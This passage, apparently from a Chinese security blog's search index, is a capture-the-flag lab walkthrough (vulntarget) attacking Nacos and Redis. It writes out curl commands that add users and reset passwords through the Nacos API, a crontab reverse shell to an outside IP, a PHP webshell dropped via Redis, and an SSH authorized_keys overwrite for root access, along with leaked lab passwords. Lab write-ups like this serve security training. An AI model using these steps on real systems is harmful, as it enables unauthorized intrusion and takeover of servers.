+username    &quot;nacos&quot;password    &quot;$2a$10$/WcAwSqpXiDCq/zpuNVQGOPBIZ7jpUv60MyyXNQEqkK4b8k3rDQU6&quot;
+
+
+于是我们尝试如下命令来添加新用户或者改密码
+# linux 是用单引号，window用双引号，否则会提示curl: no URL specified# 新增用户curl -XPOST -d &#x27;username=test&amp;password=test&#x27; &#x27;http://192.168.100.50:8848/nacos/v1/auth/users&#x27;# 修改用户密码curl -XPUT -d &#x27;username=nacos&amp;newPassword=nacos&#x27; &#x27;http://192.168.100.50:8848/nacos/v1/auth/users&#x27;# 删除用户curl -XDELETE -d &#x27;username=test&#x27; &#x27;http://192.168.100.50:8848/nacos/v1/auth/users&#x27;
+
+
+访问首页/nacos，成功登录
+
+很多内网应用都会把application.yml配置在这个配置中心，基本可以通过snakeyaml的payload横向打所有内网应用，结合https://github.com/artsploit/yaml-payload， 修改server配置，可导致RCE
+redis根据前面nacos可以发现redis-task，配置信息如下：
+server:  port: 8586 api:  task:    url: http://127.0.0.1/api/office/taskHandle knife4j:  redis:    host: 0.0.0.0    password: nbsg@123456    port: 6379    databases: 0,1,2,3,4,5,6,7    timeout: 60000  logging:  config: classpath:logback.xml xxl:  job:    admin:      addresses: http://127.0.0.1:8998/xxl-job-admin    accessToken: X336qlhSuYz2Nshk    executor:      appname: redis-task      address:      ip:      port: 5599      logpath: /data/logs/xxl-job/redis-task      logretentiondays: 5  app:  mq:    delay:      queue: bb_DELAY_QUEUE      exchange: bb_delay_exchange spring:  rabbitmq:    host: 127.0.0.1    port: 5672    username: admin    password: global2018#    virtualHost: /
+
+可知redis的密码是nbsg@123456，并使用redis-cli成功连接redis服务器，其版本为4.0.10（不用密码也行🤐
+redis-cli -h 192.168.88.70 -a &quot;nbsg@123456&quot;
+
+
+利用姿势1：在crontab里写定时任务反弹shell（失败）
+
+相关配置文件：
+&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名
+&#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。
+&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。
+我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。
+
+# 添加名为xxx的key，值为后面反弹shell的语句，5个星号代表每分钟执行一次，其中的\n同样是为了换行，避免crontab的语法错误set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/192.168.150.128/1234 0&gt;&amp;1\n\n&quot;# 在kali和ubantu中，其文件位置为/var/spool/cron/crontabs/root，在centos系列中位置为/var/spool/cron/root，通常情况下没有root文件，需要自己创建config set dir /var/spool/cronconfig set dbfilename rootsave
+
+
+但是等了半天还是没弹，于是查看一下计划任务发现也没有反弹shell命令写入了靶机
+cd /var/spool/croncrontab -l
+
+
+检查定时任务是否执行
+tail -10000f /var/log/cron | grep &#x27;bash&#x27;
+
+利用姿势2：利用redis数据库的备份功能，直接向Web目录中写webshell，但是发现不是默认路径无法利用
+config set dir /var/www/html/config set dbfilename 1.phpset webshell &quot;&lt;?php phpinfo();?&gt;&quot;save
+
+
+利用姿势3：redis写入ssh公钥，获取操作系统权限
+kali生成ssh公钥和私钥，密码设置为空
+ssh-keygen -t rsa
+
+
+进入.ssh目录，然后将生成的公钥写入ceshi.txt文件
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt;ceshi.txt
+
+
+将保存ssh的公钥ceshi.txt写入redis
+cat ceshi.txt | redis-cli -h 192.168.88.70 -a &quot;nbsg@123456&quot; -x set crack
+
+
+连接redis，使用 CONFIG GET dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh）并设置上传公钥的备份文件名字为authorized_keys：
+config get dirconfig set dir /root/.ssh/config set dbfilename &quot;authorized_keys&quot;save
+
+
+成功写入ssh公钥到靶机，然后使用ssh免密登录靶机，得到flag3：flag{good_redis}
+ssh -i id_rsa root@192.168.88.70
+
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
       </tags>
   </entry>
 </search>
